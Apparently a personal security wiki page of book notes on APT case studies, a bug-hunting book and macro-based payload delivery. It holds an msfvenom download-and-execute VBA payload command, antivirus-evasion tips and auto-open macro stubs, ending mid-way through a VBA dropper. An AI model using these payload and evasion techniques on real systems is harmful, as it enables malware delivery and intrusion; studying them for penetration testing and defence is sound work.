



<!doctype html>
<html lang="en" class="no-js">
  <head>
    
      <meta charset="utf-8">
      <meta name="viewport" content="width=device-width,initial-scale=1">
      <meta http-equiv="x-ua-compatible" content="ie=edge">
      
      
      
      
        <meta name="lang:clipboard.copy" content="Copy to clipboard">
      
        <meta name="lang:clipboard.copied" content="Copied to clipboard">
      
        <meta name="lang:search.language" content="en">
      
        <meta name="lang:search.pipeline.stopwords" content="True">
      
        <meta name="lang:search.pipeline.trimmer" content="True">
      
        <meta name="lang:search.result.none" content="No matching documents">
      
        <meta name="lang:search.result.one" content="1 matching document">
      
        <meta name="lang:search.result.other" content="# matching documents">
      
        <meta name="lang:search.tokenizer" content="[\s\-]+">
      
      <link rel="shortcut icon" href="../assets/images/favicon.png">
      <meta name="generator" content="mkdocs-1.0.4, mkdocs-material-4.6.0">
    
    
      
        <title>Books - Security Knowledge Base</title>
      
    
    
      <link rel="stylesheet" href="../assets/stylesheets/application.1b62728e.css">
      
      
    
    
      <script src="../assets/javascripts/modernizr.268332fc.js"></script>
    
    
      
        <link href="https://fonts.gstatic.com" rel="preconnect" crossorigin>
        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,400,400i,700%7CRoboto+Mono&display=fallback">
        <style>body,input{font-family:"Roboto","Helvetica Neue",Helvetica,Arial,sans-serif}code,kbd,pre{font-family:"Roboto Mono","Courier New",Courier,monospace}</style>
      
    
    <link rel="stylesheet" href="../assets/fonts/material-icons.css">
    
    
      <link rel="stylesheet" href="../_site/extra.css">
    
    
      
    
    
  </head>
  
    <body dir="ltr">
  
    <svg class="md-svg">
      <defs>
        
        
      </defs>
    </svg>
    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
    <label class="md-overlay" data-md-component="overlay" for="__drawer"></label>
    
      <a href="#buy" tabindex="1" class="md-skip">
        Skip to content
      </a>
    
    
      <header class="md-header" data-md-component="header">
  <nav class="md-header-nav md-grid">
    <div class="md-flex">
      <div class="md-flex__cell md-flex__cell--shrink">
        <a href=".." title="Security Knowledge Base" class="md-header-nav__button md-logo">
          
            <i class="md-icon"></i>
          
        </a>
      </div>
      <div class="md-flex__cell md-flex__cell--shrink">
        <label class="md-icon md-icon--menu md-header-nav__button" for="__drawer"></label>
      </div>
      <div class="md-flex__cell md-flex__cell--stretch">
        <div class="md-flex__ellipsis md-header-nav__title" data-md-component="title">
          
            <span class="md-header-nav__topic">
              Security Knowledge Base
            </span>
            <span class="md-header-nav__topic">
              
                Books
              
            </span>
          
        </div>
      </div>
      <div class="md-flex__cell md-flex__cell--shrink">
        
          <label class="md-icon md-icon--search md-header-nav__button" for="__search"></label>
          
<div class="md-search" data-md-component="search" role="dialog">
  <label class="md-search__overlay" for="__search"></label>
  <div class="md-search__inner" role="search">
    <form class="md-search__form" name="search">
      <input type="text" class="md-search__input" name="query" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="query" data-md-state="active">
      <label class="md-icon md-search__icon" for="__search"></label>
      <button type="reset" class="md-icon md-search__icon" data-md-component="reset" tabindex="-1">
        &#xE5CD;
      </button>
    </form>
    <div class="md-search__output">
      <div class="md-search__scrollwrap" data-md-scrollfix>
        <div class="md-search-result" data-md-component="result">
          <div class="md-search-result__meta">
            Type to start searching
          </div>
          <ol class="md-search-result__list"></ol>
        </div>
      </div>
    </div>
  </div>
</div>
        
      </div>
      
    </div>
  </nav>
</header>
    
    <div class="md-container">
      
        
      
      
      <main class="md-main" role="main">
        <div class="md-main__inner md-grid" data-md-component="container">
          
            
              <div class="md-sidebar md-sidebar--primary" data-md-component="navigation">
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    <nav class="md-nav md-nav--primary" data-md-level="0">
  <label class="md-nav__title md-nav__title--site" for="__drawer">
    <a href=".." title="Security Knowledge Base" class="md-nav__button md-logo">
      
        <i class="md-icon"></i>
      
    </a>
    Security Knowledge Base
  </label>
  
  <ul class="md-nav__list" data-md-scrollfix>
    
      
      
      


  <li class="md-nav__item">
    <a href=".." title="Home" class="md-nav__link">
      Home
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../apt/" title="APT" class="md-nav__link">
      APT
    </a>
  </li>

    
      
      
      

  


  <li class="md-nav__item md-nav__item--active">
    
    <input class="md-toggle md-nav__toggle" data-md-toggle="toc" type="checkbox" id="__toc">
    
    
      <label class="md-nav__link md-nav__link--active" for="__toc">
        Books
      </label>
    
    <a href="./" title="Books" class="md-nav__link md-nav__link--active">
      Books
    </a>
    
      
<nav class="md-nav md-nav--secondary">
  
  
  
    <label class="md-nav__title" for="__toc">Table of contents</label>
    <ul class="md-nav__list" data-md-scrollfix>
      
        <li class="md-nav__item">
  <a href="#buy" class="md-nav__link">
    Buy
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#done" class="md-nav__link">
    Done
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#in-progress" class="md-nav__link">
    In progress
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#advanced-penetration-testing-hacking-the-worlds-most-secure-networks" class="md-nav__link">
    Advanced Penetration Testing Hacking the World's Most Secure Networks
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#a-bug-hunters-diary-stop-ch-4" class="md-nav__link">
    A Bug Hunter's Diary (Stop: Ch-4)
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#advanced-penetration-testing-hacking-the-worlds-most-secure-networks_1" class="md-nav__link">
    Advanced Penetration Testing Hacking the World's Most Secure Networks
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#threat-modeling-designing-for-security" class="md-nav__link">
    Threat Modeling Designing for Security
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
      
      
      
      
    </ul>
  
</nav>
    
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../bug-hunting/" title="Bug hunting" class="md-nav__link">
      Bug hunting
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../career/" title="Career" class="md-nav__link">
      Career
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../collections/" title="Collections" class="md-nav__link">
      Collections
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../crypto/" title="Crypto" class="md-nav__link">
      Crypto
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../databases-sqlserver/" title="Databases - SqlServer" class="md-nav__link">
      Databases - SqlServer
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../databases/" title="Databases" class="md-nav__link">
      Databases
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../defense/" title="Defense" class="md-nav__link">
      Defense
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../dfir/" title="DFIR" class="md-nav__link">
      DFIR
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../embedded-and-iot/" title="Embedded and iot" class="md-nav__link">
      Embedded and iot
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../exploits_and_shellcoding/" title="Exploits and shellcoding" class="md-nav__link">
      Exploits and shellcoding
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../iam-kerberos/" title="IAM - Kerberos" class="md-nav__link">
      IAM - Kerberos
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../iam/" title="IAM" class="md-nav__link">
      IAM
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../languages/" title="Languages" class="md-nav__link">
      Languages
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../linux-issues/" title="Linux issues" class="md-nav__link">
      Linux issues
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../linux/" title="Linux" class="md-nav__link">
      Linux
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../malware/" title="Malware" class="md-nav__link">
      Malware
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../network/" title="Network" class="md-nav__link">
      Network
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../non-security/" title="Z Non Security" class="md-nav__link">
      Z Non Security
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../operating-systems/" title="Operating systems" class="md-nav__link">
      Operating systems
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../osint/" title="OSINT" class="md-nav__link">
      OSINT
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../password-attacks/" title="Password attacks" class="md-nav__link">
      Password attacks
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../ports-and-protocols/" title="Ports and protocols" class="md-nav__link">
      Ports and protocols
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../practice/" title="Practice Environments" class="md-nav__link">
      Practice Environments
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../red-blue-team/" title="Red blue team" class="md-nav__link">
      Red blue team
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../reverse-engineering/" title="Reverse engineering" class="md-nav__link">
      Reverse engineering
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../rf-and-sdr/" title="RF and SDR" class="md-nav__link">
      RF and SDR
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../social-engineering/" title="Social engineering" class="md-nav__link">
      Social engineering
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../steganography/" title="Steganography" class="md-nav__link">
      Steganography
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../vulnerable/" title="Vulnerable" class="md-nav__link">
      Vulnerable
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../web/" title="Web" class="md-nav__link">
      Web
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../wifi/" title="WiFi & Wireless" class="md-nav__link">
      WiFi & Wireless
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-35" type="checkbox" id="nav-35">
    
    <label class="md-nav__link" for="nav-35">
      Certifications
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
      <label class="md-nav__title" for="nav-35">
        Certifications
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../certifications/cissp/" title="CISSP" class="md-nav__link">
      CISSP
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../certifications/osce/" title="OSCE" class="md-nav__link">
      OSCE
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../certifications/oswe/" title="Oswe" class="md-nav__link">
      Oswe
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-35-4" type="checkbox" id="nav-35-4">
    
    <label class="md-nav__link" for="nav-35-4">
      Oscp
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="2">
      <label class="md-nav__title" for="nav-35-4">
        Oscp
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../certifications/oscp/0-cheatsheet/" title="Enumeration" class="md-nav__link">
      Enumeration
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../certifications/oscp/_collections/" title="collections" class="md-nav__link">
       collections
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../certifications/oscp/_preparation/" title="Was checking" class="md-nav__link">
      Was checking
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../certifications/oscp/lab-setup/" title="Lab Setup" class="md-nav__link">
      Lab Setup
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../certifications/oscp/notes/" title="Notes" class="md-nav__link">
      Notes
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../certifications/oscp/practice-vulnhub/" title="Practice" class="md-nav__link">
      Practice
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../certifications/oscp/setup/" title="Setup" class="md-nav__link">
      Setup
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../certifications/oscp/y-Tools/" title="Tools" class="md-nav__link">
      Tools
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-35-4-9" type="checkbox" id="nav-35-4-9">
    
    <label class="md-nav__link" for="nav-35-4-9">
      Cheatsheet
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="3">
      <label class="md-nav__title" for="nav-35-4-9">
        Cheatsheet
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../certifications/oscp/cheatsheet/0-cheatsheet/" title="Cheatsheets" class="md-nav__link">
      Cheatsheets
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../certifications/oscp/cheatsheet/download/" title="Download" class="md-nav__link">
      Download
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../certifications/oscp/cheatsheet/exploits/" title="Exploits" class="md-nav__link">
      Exploits
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../certifications/oscp/cheatsheet/post-exploitation/" title="Post exploitation" class="md-nav__link">
      Post exploitation
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../certifications/oscp/cheatsheet/share-files/" title="Share files" class="md-nav__link">
      Share files
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../certifications/oscp/cheatsheet/shell/" title="Bash" class="md-nav__link">
      Bash
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../certifications/oscp/cheatsheet/tty/" title="TTY" class="md-nav__link">
      TTY
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../certifications/oscp/cheatsheet/web/" title="Web" class="md-nav__link">
      Web
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../certifications/oscp/cheatsheet/windows/" title="Windows" class="md-nav__link">
      Windows
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-35-4-9-10" type="checkbox" id="nav-35-4-9-10">
    
    <label class="md-nav__link" for="nav-35-4-9-10">
      Enumeration
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="4">
      <label class="md-nav__title" for="nav-35-4-9-10">
        Enumeration
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../certifications/oscp/cheatsheet/enumeration/network/" title="Network" class="md-nav__link">
      Network
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../certifications/oscp/cheatsheet/enumeration/vulnerability/" title="Vulnerability" class="md-nav__link">
      Vulnerability
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../certifications/oscp/cheatsheet/enumeration/windows-local/" title="Windows local" class="md-nav__link">
      Windows local
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
      </ul>
    </nav>
  </li>

        
      </ul>
    </nav>
  </li>

        
      </ul>
    </nav>
  </li>

    
      
      
      


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-36" type="checkbox" id="nav-36">
    
    <label class="md-nav__link" for="nav-36">
      Cloud
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
      <label class="md-nav__title" for="nav-36">
        Cloud
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../cloud/aws/" title="Aws" class="md-nav__link">
      Aws
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../cloud/azuer-o360/" title="Azuer o360" class="md-nav__link">
      Azuer o360
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../cloud/general/" title="General" class="md-nav__link">
      General
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

    
      
      
      


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-37" type="checkbox" id="nav-37">
    
    <label class="md-nav__link" for="nav-37">
      Devops
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
      <label class="md-nav__title" for="nav-37">
        Devops
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../devops/CKAD/" title="CKAD" class="md-nav__link">
      CKAD
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../devops/container/" title="Container" class="md-nav__link">
      Container
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../devops/docker/" title="Docker" class="md-nav__link">
      Docker
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../devops/istio/" title="Istio" class="md-nav__link">
      Istio
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../devops/kubernetes/" title="Kubernetes" class="md-nav__link">
      Kubernetes
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

    
      
      
      


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-38" type="checkbox" id="nav-38">
    
    <label class="md-nav__link" for="nav-38">
      Windows
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
      <label class="md-nav__title" for="nav-38">
        Windows
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../windows/active-directory/" title="Active Directory" class="md-nav__link">
      Active Directory
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../windows/powershell/" title="Powershell" class="md-nav__link">
      Powershell
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../windows/windows-issues/" title="Windows issues" class="md-nav__link">
      Windows issues
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../windows/windows-privilege-escalation/" title="Windows Privilege Escalation" class="md-nav__link">
      Windows Privilege Escalation
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../windows/windows/" title="Windows" class="md-nav__link">
      Windows
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

    
  </ul>
</nav>
                  </div>
                </div>
              </div>
            
            
              <div class="md-sidebar md-sidebar--secondary" data-md-component="toc">
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    
<nav class="md-nav md-nav--secondary">
  
  
  
    <label class="md-nav__title" for="__toc">Table of contents</label>
    <ul class="md-nav__list" data-md-scrollfix>
      
        <li class="md-nav__item">
  <a href="#buy" class="md-nav__link">
    Buy
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#done" class="md-nav__link">
    Done
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#in-progress" class="md-nav__link">
    In progress
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#advanced-penetration-testing-hacking-the-worlds-most-secure-networks" class="md-nav__link">
    Advanced Penetration Testing Hacking the World's Most Secure Networks
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#a-bug-hunters-diary-stop-ch-4" class="md-nav__link">
    A Bug Hunter's Diary (Stop: Ch-4)
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#advanced-penetration-testing-hacking-the-worlds-most-secure-networks_1" class="md-nav__link">
    Advanced Penetration Testing Hacking the World's Most Secure Networks
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#threat-modeling-designing-for-security" class="md-nav__link">
    Threat Modeling Designing for Security
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
      
      
      
      
    </ul>
  
</nav>
                  </div>
                </div>
              </div>
            
          
          <div class="md-content">
            <article class="md-content__inner md-typeset">
              
                
                
                  <h1>Books</h1>
                
                <h2 id="buy">Buy<a class="headerlink" href="#buy" title="Permanent link">&para;</a></h2>
<ul>
<li>Art of Deception (Wiley, 2002)</li>
<li>Chris Hadnagy’s Social Engineering: The Art of Human Hacking (Wiley, 2010).</li>
</ul>
<h2 id="done">Done<a class="headerlink" href="#done" title="Permanent link">&para;</a></h2>
<ul>
<li>Linux Basics for Hackers Getting Started with Networking, Scripting, and Security in Kali</li>
</ul>
<h2 id="in-progress">In progress<a class="headerlink" href="#in-progress" title="Permanent link">&para;</a></h2>
<h3 id="advanced-penetration-testing-hacking-the-worlds-most-secure-networks">Advanced Penetration Testing Hacking the World's Most Secure Networks<a class="headerlink" href="#advanced-penetration-testing-hacking-the-worlds-most-secure-networks" title="Permanent link">&para;</a></h3>
<ul>
<li>Take several case studies of <code class="codehilite"><span class="n">APT</span></code>s and walk the reader through how the attack was done.</li>
<li>The <code class="codehilite"><span class="n">Kane</span></code> incident <ul>
<li><a href="http://www.securityfocus.com/news/122">http://www.securityfocus.com/news/122</a></li>
<li><code class="codehilite"><span class="n">BO2K</span> <span class="n">Remote</span> <span class="k">Access</span> <span class="n">Trojans</span></code> by <code class="codehilite"><span class="n">Cult</span> <span class="k">of</span> <span class="n">the</span> <span class="n">Dead</span> <span class="n">Cow</span></code> was left to be discovered. <code class="codehilite"><span class="n">Washington</span> <span class="n">University</span><span class="err">&#39;</span><span class="n">s</span> <span class="n">Medical</span> <span class="n">Center</span></code> believed that the attack was prevented. </li>
</ul>
</li>
</ul>
<h3 id="a-bug-hunters-diary-stop-ch-4">A Bug Hunter's Diary (Stop: Ch-4)<a class="headerlink" href="#a-bug-hunters-diary-stop-ch-4" title="Permanent link">&para;</a></h3>
<ul>
<li><a href="http://www.trapkit.de/books/bhd/en.html">http://www.trapkit.de/books/bhd/en.html</a></li>
<li>Thought process in finding a VLC buffer overflow (TiVo media file)<ul>
<li>See Dick Grune and Ceriel J.H. Jacobs, Parsing Techniques: A Practical Guide, 2<sup>nd</sup> ed. (New York: Springer Science+Business Media, 2008), 1.</li>
<li>Media samples: <a href="http://samples.mplayerhq.hu/">http://samples.mplayerhq.hu/</a></li>
<li>David Litchfield, “Variations in Exploit Methods Between Linux and Windows,” 2003<ul>
<li><a href="https://www.blackhat.com/presentations/bh-usa-03/bh-us-03-litchfield-paper.pdf">https://www.blackhat.com/presentations/bh-usa-03/bh-us-03-litchfield-paper.pdf</a></li>
<li><a href="https://www.youtube.com/watch?v=VM1PzvChNv8">https://www.youtube.com/watch?v=VM1PzvChNv8</a></li>
</ul>
</li>
</ul>
</li>
<li>Sun Solaris IOCTL related kernel vulnerability<ul>
<li>First use Null pointer dereference to crash the system<ul>
<li>EIP is set to 0 value and  since 0 is not a valid address, system crashes</li>
<li>However, if we map Zero page, it's possible to take control of EIP</li>
</ul>
</li>
<li>Then use Zero page to get control over EIP/RIP<ul>
<li>kernel and the user space of a process share the same zero page: “Attacking the Core: Kernel Exploiting Notes” by twiz &amp; sgrakkyu, which can be found at <a href="http://www.phrack.com/issues.html?issue=64&amp;id=6">http://www.phrack.com/issues.html?issue=64&amp;id=6</a></li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="advanced-penetration-testing-hacking-the-worlds-most-secure-networks_1">Advanced Penetration Testing Hacking the World's Most Secure Networks<a class="headerlink" href="#advanced-penetration-testing-hacking-the-worlds-most-secure-networks_1" title="Permanent link">&para;</a></h3>
<ul>
<li>APT<ul>
<li>Capable of developing their own tools</li>
<li>Very strong understanding of how modern intrusion detection and prevention systems</li>
<li>APT tests involve, whether directly or indirectly, human manipulation. </li>
<li>Steps<ul>
<li>Initial compromise<ul>
<li>Usually done with social engineering techniques</li>
<li>Casting a wide net to catch the low hanging fruit is not an acceptable way to model APTs</li>
</ul>
</li>
<li>Establish beachhead<ul>
<li>Ensure future access to compromised assets without needing a repeat initial intrusion</li>
<li>Command &amp; Control</li>
</ul>
</li>
<li>Escalate privileges</li>
<li>Internal reconnaissance</li>
<li>Network colonization</li>
<li>Persist</li>
<li>Complete mission<ul>
<li>Exfiltrate stolen data</li>
</ul>
</li>
</ul>
</li>
<li>Mights about signs:<ul>
<li>Increase in elevated log-ons late at night</li>
<li>Finding widespread backdoor Trojans</li>
<li>Unexpected information flows</li>
<li>Discovering unexpected data bundles</li>
<li>Detecting pass-the-hash hacking tools</li>
</ul>
</li>
</ul>
</li>
<li>THE “KANE” INCIDENT<ul>
<li>Kane was able to stay hidden in the Medical Center networks by allowing his victims to believe they had expelled him</li>
<li>Leaving easily discoverable BO2K Remote Access Trojans</li>
<li><a href="http://www.securityfocus.com/news/122">http://www.securityfocus.com/news/122</a></li>
</ul>
</li>
<li>Simulating Advanced Persistent Threat<ul>
<li>Payload Delivery <ul>
<li>Part 1: Learning How to Use the VBA Macro<ul>
<li>Microsoft Office (2010 onward) the default behavior of the application is to make no distinction between signed and unsigned code</li>
<li>How NOT to:<ul>
<li><code class="codehilite"><span class="n">msfvenom</span> <span class="o">-</span><span class="n">p</span> <span class="n">windows</span><span class="o">/</span><span class="n">download_exec</span> <span class="o">-</span><span class="n">f</span> <span class="n">vba</span> <span class="o">-</span><span class="n">e</span> <span class="n">shikata</span><span class="o">-</span><span class="n">ga</span><span class="o">-</span><span class="n">nai</span> <span class="o">-</span><span class="n">i</span> <span class="mi">5</span> <span class="o">-</span><span class="n">a</span> <span class="n">x86</span> <span class="c1">--platform Windows EXE=c:\temp\payload.exe URL=http://www.wherever.com</span></code></li>
<li>functions being imported from kernel32.dll<ul>
<li>create a process thread</li>
<li>allocate memory for the shellcode</li>
<li>move the shellcode into that memory</li>
</ul>
</li>
<li>lot of virus scanners won’t scan the declaration sec- tion, only the main body of code<ul>
<li>Instead of <code class="codehilite"><span class="n">Private</span> <span class="k">Declare</span> <span class="n">PtrSafe</span> <span class="k">Function</span> <span class="n">CreateThread</span> <span class="n">Lib</span> <span class="ss">&quot;kernel32&quot;</span> <span class="p">(</span><span class="n">ByVal</span> <span class="n">Zdz</span> <span class="k">As</span> <span class="n">Long</span><span class="p">,</span> <span class="n">ByVal</span> <span class="n">Tfnsv</span> <span class="k">As</span> <span class="n">Long</span><span class="p">,</span> <span class="n">ByVal</span> <span class="n">Kyfde</span> <span class="k">As</span> <span class="n">LongPtr</span><span class="p">,</span> <span class="n">Spjyjr</span> <span class="k">As</span> <span class="n">Long</span><span class="p">,</span> <span class="n">ByVal</span> <span class="n">Pcxhytlle</span> <span class="k">As</span> <span class="n">Long</span><span class="p">,</span> <span class="n">Coupxdxe</span> <span class="k">As</span> <span class="n">Long</span><span class="p">)</span> <span class="k">As</span> <span class="n">LongPtr</span></code></li>
<li>Declare <code class="codehilite"><span class="n">Private</span> <span class="k">Declare</span> <span class="n">PtrSafe</span> <span class="k">Function</span> <span class="n">CreateThread</span> <span class="n">Lib</span> <span class="ss">&quot;kernel32&quot;</span> <span class="k">Alias</span> <span class="ss">&quot;CTAlias&quot;</span> <span class="p">(</span><span class="n">ByVal</span> <span class="n">Zdz</span> <span class="k">As</span> <span class="n">Long</span><span class="p">,</span> <span class="n">ByVal</span> <span class="n">Tfnsv</span> <span class="k">As</span> <span class="n">Long</span><span class="p">,</span> <span class="n">ByVal</span> <span class="n">Kyfde</span> <span class="k">As</span> <span class="n">LongPtr</span><span class="p">,</span> <span class="n">Spjyjr</span> <span class="k">As</span> <span class="n">Long</span><span class="p">,</span> <span class="n">ByVal</span> <span class="n">Pcxhytlle</span> <span class="k">As</span> <span class="n">Long</span><span class="p">,</span> <span class="n">Coupxdxe</span> <span class="k">As</span> <span class="n">Long</span><span class="p">)</span> <span class="k">As</span> <span class="n">LongPtr</span></code></li>
<li>And use <code class="codehilite"><span class="n">CTAlias</span></code> in  body to bypass some AVs</li>
</ul>
</li>
<li>modern antivirus software is capable of passing compiled code (including shellcode) into a micro-virtual machine to test heuristically</li>
<li>Do not leave shellcode like structures open</li>
<li>Use of one auto-open subroutine is suspicious
  <div class="codehilite"><pre><span></span><span class="nv">Sub</span> <span class="nv">Auto_Open</span>
    <span class="nv">Main</span> <span class="nv">block</span> <span class="nv">of</span> <span class="nv">code</span>
<span class="k">End</span> <span class="nv">Sub</span>
</pre></div>
  <div class="codehilite"><pre><span></span><span class="nv">Sub</span> <span class="nv">AutoOpen</span><span class="ss">()</span>
    <span class="nv">Auto_Open</span>
<span class="k">End</span> <span class="nv">Sub</span>
</pre></div>
  <div class="codehilite"><pre><span></span><span class="nv">Sub</span> <span class="nv">Workbook_Open</span><span class="ss">()</span>
  <span class="nv">Auto_Open</span>
<span class="k">End</span> <span class="nv">Sub</span>
</pre></div></li>
<li>native functions within VBA that allow an attacker to download and execute code from the Internet (these are detected)<ul>
<li>Shell</li>
<li>URLDownLoadToFile</li>
</ul>
</li>
</ul>
</li>
<li>Using a VBA/VBS Dual Stager<ul>
<li>VBA is only ever used within Office documents, VBS is a standalone scripting</li>
<li>innocent-looking VBA macro that will carry a VBS payload, write it to file, and execute it
  <div class="codehilite"><pre><span></span><span class="nv">Sub</span> <span class="nv">WritePayload</span><span class="ss">()</span>
    <span class="nv">Dim</span> <span class="nv">PayLoadFile</span> <span class="nv">As</span> <span class="nv">Integer</span>
    <span class="nv">Dim</span> <span class="nv">FilePath</span> <span class="nv">As</span> <span class="nv">String</span>
